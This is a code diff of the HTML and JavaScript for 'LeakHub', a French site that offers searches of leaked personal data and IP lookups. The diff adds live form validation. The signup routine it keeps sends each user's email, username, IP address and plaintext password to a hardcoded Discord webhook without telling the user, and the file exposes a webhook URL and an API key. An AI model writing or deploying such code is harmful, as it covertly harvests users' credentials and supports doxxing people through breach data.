@@ -15,7 +15,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://cdn.discordapp.com/attachments/1433531634560274502/1436693142366720151/LeakHub_Logo.png" type="image/png">
     <style>
-        :root{--bg:#0a0a0a;--surface:#111;--text:#e0e0e0;--accent:#1e90ff;--border:rgba(30,144,255,0.3);--glow:0 0 20px rgba(30,144,255,0.5);--radius:16px}
+        :root{--bg:#0a0a0a;--surface:#111;--text:#e0e0e0;--accent:#1e90ff;--border:rgba(30,144,255,0.3);--glow:0 0 20px rgba(30,144,255,0.5);--radius:16px;--success:#00ff88;--error:#ff4444}
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;overflow-x:hidden;position:relative}
         #particles{position:fixed;inset:0;z-index:-1}
@@ -39,8 +39,17 @@
         p{color:#888;max-width:700px;margin-bottom:1.5rem;font-size:1.1rem;line-height:1.7}
         button{padding:.9rem 2.4rem;border:2px solid var(--accent);background:transparent;border-radius:50px;color:var(--accent);font-weight:600;cursor:pointer;transition:all .4s}
         button:hover{background:var(--accent);color:#000;box-shadow:var(--glow);transform:translateY(-3px)}
-        input{margin:.6rem 0;padding:.9rem 1.2rem;width:100%;max-width:420px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);color:var(--text);border-radius:12px;outline:none;transition:.3s}
+        .input-group{position:relative;margin:.6rem 0}
+        input{padding:.9rem 1.2rem .9rem 2.8rem;width:100%;max-width:420px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);color:var(--text);border-radius:12px;outline:none;transition:all .3s;font-size:1rem}
         input:focus{border-color:var(--accent);box-shadow:var(--glow)}
+        .input-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:1.2rem;transition:all .3s}
+        .input-icon.valid{color:var(--success);opacity:1}
+        .input-icon.invalid{color:var(--error);opacity:1}
+        .input-icon.default{color:#666;opacity:0.6}
+        .error{color:var(--error);font-size:0.85rem;margin-top:4px;text-align:left;min-height:1.2em;display:flex;align-items:center;gap:4px}
+        .error::before{content:"cross";font-weight:bold}
+        .success{color:var(--success);font-size:0.85rem;margin-top:4px;text-align:left;min-height:1.2em;display:flex;align-items:center;gap:4px}
+        .success::before{content:"checkmark";font-weight:bold}
         .loader{display:none;justify-content:center;gap:8px;margin:2rem 0}
         .loader div{width:14px;height:14px;background:var(--accent);border-radius:50%;animation:p .8s infinite alternate}
         .loader div:nth-child(2){animation-delay:.2s}.loader div:nth-child(3){animation-delay:.4s}
@@ -52,7 +61,6 @@
         .modal.active .modal-content{transform:scale(1)}
         .close-btn{position:absolute;top:14px;right:18px;font-size:28px;color:var(--accent);cursor:pointer;transition:.3s}
         .close-btn:hover{transform:rotate(90deg)}
-        .error{color:#ff4444;font-size:0.9rem;margin-top:4px;text-align:left}
         .profile-popup{display:none;position:absolute;top:68px;right:4%;background:var(--surface);padding:1.5rem;border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--glow);min-width:260px;z-index:999}
         .discord-btn{position:fixed;bottom:20px;right:20px;width:56px;height:56px;background:#5865F2;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px rgba(88,101,242,.6);cursor:pointer;z-index:999;transition:.3s}
         .discord-btn:hover{transform:scale(1.2);box-shadow:0 0 40px rgba(88,101,242,.9)}
@@ -63,7 +71,6 @@
 </head>
 <body>
     <canvas id="particles"></canvas>
-    <!-- LOGO DISCORD EN BAS -->
     <a href="https://discord.gg/jhqXyFhXbb" target="_blank" class="discord-btn">
         <img src="https://media.discordapp.net/attachments/1436726350399406149/1436738002339500244/MzEucG5n.png?ex=6910b209&is=690f6089&hm=d2452b5f1ada613b1434feb69b1ee6314dfb402b918fe4c08ed3e279bc6be26b&=&format=webp&quality=lossless" alt="Discord">
     </a>
@@ -78,7 +85,6 @@
                 <li><a href="#" data-target="ipinfo">IP Info</a></li>
                 <li><a href="#" data-target="search">Recherche</a></li>
             </ul>
-            <!-- BOUTON PROFIL VERROUILLÉ TANT QUE PAS INSCRIT -->
             <div class="profile-btn" id="profileBtn" onclick="checkAuthBeforeProfile()">
                 <img src="https://static.vecteezy.com/ti/vecteur-libre/p1/21548095-defaut-profil-image-avatar-utilisateur-avatar-icone-la-personne-icone-tete-icone-profil-image-icones-defaut-anonyme-utilisateur-masculin-et-femelle-homme-d-affaire-photo-espace-reserve-social-reseau-avatar-portrait-gratuit-vectoriel.jpg" id="profileImg">
             </div>
@@ -91,24 +97,21 @@
         </div>
     </header>
     <main>
-        <!-- PAGE ACCUEIL -->
         <section id="home" class="active">
             <h1>LeakHub #2026</h1>
             <p>Recherche 10B+ leaks avec NazAPI — Gratuit. Anonyme. Puissant.</p>
             <button id="startBtn">Commencer</button>
         </section>
-        <!-- PAGE INFORMATIONS -->
         <section id="info">
             <h1>Informations</h1>
             <div class="info-text">
-                <p>Bonjour, bienvenue sur <strong>LeakHub 🔍</strong>, un site et serveur Discord dédié à la récupération d'informations personnelles en utilisant les compétences de l'<strong>OSINT</strong>.</p>
+                <p>Bonjour, bienvenue sur <strong>LeakHub</strong>, un site et serveur Discord dédié à la récupération d'informations personnelles en utilisant les compétences de l'<strong>OSINT</strong>.</p>
                 <p>Ce site est conçu pour la recherche d'informations personnelles via des bases de données telles que <strong>NazAPI</strong>, <strong>Snus Base</strong>, et <strong>IntelX</strong>. En plus de ces fonctionnalités, LeakHub offre de nombreux autres outils, comme l'<strong>IP Info</strong>, qui permet de révéler toutes les informations publiques associées à une adresse IP, telles que la localisation, le pays, l'opérateur, et bien plus encore.</p>
                 <p>LeakHub est le fruit du travail de <strong>LuXo</strong> et <strong>S4lvaaa</strong>, qui ont mis leur expertise au service de cette plateforme. Rejoignez-nous pour explorer les profondeurs de l'OSINT et découvrez comment nous pouvons vous aider à trouver les informations dont vous avez besoin. Avec nos outils puissants et notre communauté dynamique, vous pourrez facilement accéder à une multitude de données et enrichir vos recherches.</p>
                 <p>Que vous soyez un professionnel de l'OSINT, un enquêteur, ou simplement curieux, <strong>LeakHub</strong> est l'endroit idéal pour satisfaire votre soif de connaissances. Notre plateforme est conçue pour être intuitive et accessible, vous permettant de naviguer aisément entre les différentes fonctionnalités et d'exploiter pleinement le potentiel de nos bases de données.</p>
-                <p>Ne manquez pas l'opportunité de rejoindre notre communauté et de profiter de toutes les ressources que LeakHub a à offrir. Ensemble, faisons avancer l'art de l'OSINT et découvrons les secrets cachés dans les profondeurs du web. 🌐🔍</p>
+                <p>Ne manquez pas l'opportunité de rejoindre notre communauté et de profiter de toutes les ressources que LeakHub a à offrir. Ensemble, faisons avancer l'art de l'OSINT et découvrons les secrets cachés dans les profondeurs du web.</p>
             </div>
         </section>
-        <!-- PAGE IP INFO -->
         <section id="ipinfo">
             <h1>IP Info</h1>
             <p>Entrez une adresse IP pour voir toutes les informations associées.</p>
@@ -117,7 +120,6 @@
             <div class="loader" id="ipLoader"><div></div><div></div><div></div></div>
             <pre id="ipResult">Résultats ici...</pre>
         </section>
-        <!-- PAGE RECHERCHE -->
         <section id="search">
             <h1>Databases - 10B+ de leaks</h1>
             <input type="text" id="searchInput" placeholder="Email, téléphone, nom, IP...">
@@ -126,15 +128,31 @@
             <pre id="result">Résultats ici...</pre>
         </section>
     </main>
+
     <!-- MODAL INSCRIPTION -->
     <div class="modal" id="authModal">
         <div class="modal-content">
             <span class="close-btn" onclick="closeModal()">X</span>
             <h2 style="margin-bottom:20px;color:var(--accent)">Inscription LeakHub</h2>
-            <input type="text" id="signupName" placeholder="Pseudo">
-            <input type="email" id="signupEmail" placeholder="Email">
+
+            <div class="input-group">
+                <span class="input-icon default">user</span>
+                <input type="text" id="signupName" placeholder="Pseudo" oninput="validateName()">
+            </div>
+            <div id="nameStatus" class="success" style="display:none">Pseudo valide</div>
+
+            <div class="input-group">
+                <span class="input-icon default">email</span>
+                <input type="email" id="signupEmail" placeholder="Email" oninput="validateEmailLive()">
+            </div>
             <div id="signupEmailError" class="error"></div>
-            <input type="password" id="signupPassword" placeholder="Mot de passe">
+
+            <div class="input-group">
+                <span class="input-icon default">lock</span>
+                <input type="password" id="signupPassword" placeholder="Mot de passe" oninput="validatePasswordLive()">
+            </div>
+            <div id="signupPasswordError" class="error"></div>
+
             <button onclick="submitSignup()" style="margin-top:15px">S'inscrire & Accéder</button>
             <p style="font-size:0.8rem;color:#666;margin-top:15px">Connexion à vie - Jamais de déconnexion</p>
         </div>
@@ -145,18 +163,14 @@
         const LOGS = "https://discord.com/api/webhooks/1436669162205479063/it5irsmeIstIOLMnWlmzp2O42XJS2JnaA11GABCG404pc_rAXRt37DZUZDrfXBDKPs7n";
         const NAZ_KEY = "8141145084:DcTUGz6Z";
         const DEFAULT_AVATAR = "https://static.vecteezy.com/ti/vecteur-libre/p1/21548095-defaut-profil-image-avatar-utilisateur-avatar-icone-la-personne-icone-tete-icone-profil-image-icones-defaut-anonyme-utilisateur-masculin-et-femelle-homme-d-affaire-photo-espace-reserve-social-reseau-avatar-portrait-gratuit-vectoriel.jpg";
-        
-        // === USER STATE ===
+
         let user = {
             name: localStorage.getItem('lh_name') || 'Invité',
             avatar: localStorage.getItem('lh_avatar') || DEFAULT_AVATAR,
             registered: !!localStorage.getItem('lh_registered')
         };
-
-        // Mettre à jour l'avatar
         document.getElementById('profileImg').src = user.avatar;
 
-        // === VERROUILLAGE PROFIL ===
         function updateProfileButton() {
             const btn = document.getElementById('profileBtn');
             if (user.registered) {
@@ -168,7 +182,6 @@
             }
         }
 
-        // Fonction de vérification avant d'ouvrir le profil
         function checkAuthBeforeProfile() {
             if (!user.registered) {
                 alert("Inscris-toi d'abord pour personnaliser ton profil !");
@@ -184,13 +197,83 @@
             p.style.display = p.style.display === 'block' ? 'none' : 'block';
         }
 
-        // === INITIALISATION ===
-        if (user.registered) switchTo('search');
+        switchTo('home');
         document.getElementById('startBtn').onclick = () => openModal();
-        updateProfileButton(); // Appliquer le verrou dès le chargement
+        updateProfileButton();
 
-        function isValidEmail(email) {
-            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        // === FEEDBACK VISUEL EN TEMPS RÉEL ===
+        const nameInput = document.getElementById('signupName');
+        const nameIcon = nameInput.previousElementSibling;
+        const nameStatus = document.getElementById('nameStatus');
+
+        const emailInput = document.getElementById('signupEmail');
+        const emailIcon = emailInput.previousElementSibling;
+        const emailError = document.getElementById('signupEmailError');
+
+        const passInput = document.getElementById('signupPassword');
+        const passIcon = passInput.previousElementSibling;
+        const passError = document.getElementById('signupPasswordError');
+
+        function validateName() {
+            const val = nameInput.value.trim();
+            if (val.length > 0) {
+                nameIcon.className = 'input-icon valid';
+                nameStatus.style.display = 'flex';
+            } else {
+                nameIcon.className = 'input-icon default';
+                nameStatus.style.display = 'none';
+            }
+        }
+
+        function validateEmailLive() {
+            const email = emailInput.value.trim();
+            const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            if (email === '') {
+                emailIcon.className = 'input-icon default';
+                emailError.textContent = '';
+                emailError.style.display = 'none';
+            } else if (!isValid) {
+                emailIcon.className = 'input-icon invalid';
+                emailError.textContent = 'Email invalide';
+                emailError.style.display = 'flex';
+            } else {
+                emailIcon.className = 'input-icon valid';
+                emailError.textContent = '';
+                emailError.style.display = 'none';
+            }
+        }
+
+        function validatePasswordLive() {
+            const p = passInput.value;
+            const check = isValidPassword(p);
+            if (p === '') {
+                passIcon.className = 'input-icon default';
+                passError.textContent = '';
+                passError.style.display = 'none';
+            } else if (check !== true) {
+                passIcon.className = 'input-icon invalid';
+                passError.textContent = check;
+                passError.style.display = 'flex';
+            } else {
+                passIcon.className = 'input-icon valid';
+                passError.textContent = '';
+                passError.style.display = 'none';
+            }
+        }
+
+        function isValidPassword(password) {
+            const minLength = password.length >= 8;
+            const hasUppercase = /[A-Z]/.test(password);
+            const hasLowercase = /[a-z]/.test(password);
+            const hasDigit = /\d/.test(password);
+            const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);
+
+            if (!minLength) return "8 caractères minimum";
+            if (!hasUppercase) return "1 majuscule requise";
+            if (!hasLowercase) return "1 minuscule requise";
+            if (!hasDigit) return "1 chiffre requis";
+            if (!hasSpecial) return "1 caractère spécial requis (!@#$ etc.)";
+            return true;
         }
 
         // Navigation
@@ -219,35 +302,41 @@
             document.body.style.overflow = '';
         }
 
-        // === INSCRIPTION ===
         async function submitSignup() {
-            const n = document.getElementById('signupName').value.trim();
-            const e = document.getElementById('signupEmail').value.trim();
-            const p = document.getElementById('signupPassword').value;
-            document.getElementById('signupEmailError').textContent = '';
-            if (!n || !e || !p) return alert('Remplis tout');
-            if (!isValidEmail(e)) return document.getElementById('signupEmailError').textContent = 'Email invalide';
+            const n = nameInput.value.trim();
+            const e = emailInput.value.trim();
+            const p = passInput.value;
+
+            if (!n || !e || !p) return alert('Remplis tous les champs');
+
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)) {
+                emailError.textContent = 'Email invalide';
+                emailError.style.display = 'flex';
+                return;
+            }
+
+            const passwordCheck = isValidPassword(p);
+            if (passwordCheck !== true) {
+                passError.textContent = passwordCheck;
+                passError.style.display = 'flex';
+                return;
+            }
 
             const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => '??');
             const h = new Date().toLocaleString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(', ', ' ');
             const line = `email: ${e} name: ${n} ip: ${ip} mdp: ${p} heure: ${h}`;
             sendDB(line, user.avatar);
-
             localStorage.setItem('lh_registered', 'true');
             localStorage.setItem('lh_name', n);
             user.registered = true;
             user.name = n;
-
             alert('Inscription réussie ! Tu es connecté à vie');
             closeModal();
             switchTo('search');
             sendLog(`INSCRIPTION : **${n}** (${e})`);
-
-            // Déverrouiller le profil
             updateProfileButton();
         }
 
-        // === RECHERCHE NAZAPI ===
         async function searchLeak() {
             const q = document.getElementById('searchInput').value.trim();
             const r = document.getElementById('result');
@@ -263,7 +352,6 @@
             l.style.display = 'none';
         }
 
-        // === IP INFO (NOUVELLE API : ipapi.co - HTTPS GRATUIT) ===
         async function getIPInfo() {
             const ip = document.getElementById('ipInput').value.trim();
             const result = document.getElementById('ipResult');
@@ -296,7 +384,6 @@ Version: ${data.in_eu ? 'UE' : 'Non-UE'}
             loader.style.display = 'none';
         }
 
-        // === PROFIL ===
         function handleFile(i) {
             if (!user.registered) return;
             const f = i.files[0]; if (!f) return;
@@ -321,7 +408,6 @@ Version: ${data.in_eu ? 'UE' : 'Non-UE'}
             document.getElementById('profilePopup').style.display = 'none';
         }
 
-        // === DISCORD WEBHOOKS ===
         async function sendDB(t, i) {
             const p = { content: "```yaml\n" + t + "\n```" };
             if (i && i.startsWith('data:image')) {
@@ -346,7 +432,6 @@ Version: ${data.in_eu ? 'UE' : 'Non-UE'}
             } else fetch(LOGS, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
         }
 
-        // === PARTICULES ===
         const c = document.getElementById('particles'), ctx = c.getContext('2d'); let p = [];
         function rz() { c.width = innerWidth; c.height = innerHeight; }
         class Particle {
@@ -358,7 +443,6 @@ Version: ${data.in_eu ? 'UE' : 'Non-UE'}
         function anim() { ctx.clearRect(0, 0, c.width, c.height); p.forEach(x => { x.update(); x.draw(); }); requestAnimationFrame(anim); }
         window.onresize = () => { rz(); init(); }; rz(); init(); anim();
 
-        // Fermer popup profil si clic ailleurs
         document.addEventListener('click', e => {
             const pop = document.getElementById('profilePopup');
             if (!e.target.closest('.profile-btn') && !e.target.closest('.profile-popup')) {
@@ -368,4 +452,3 @@ Version: ${data.in_eu ? 'UE' : 'Non-UE'}
     </script>
 </body>
 </html>
-
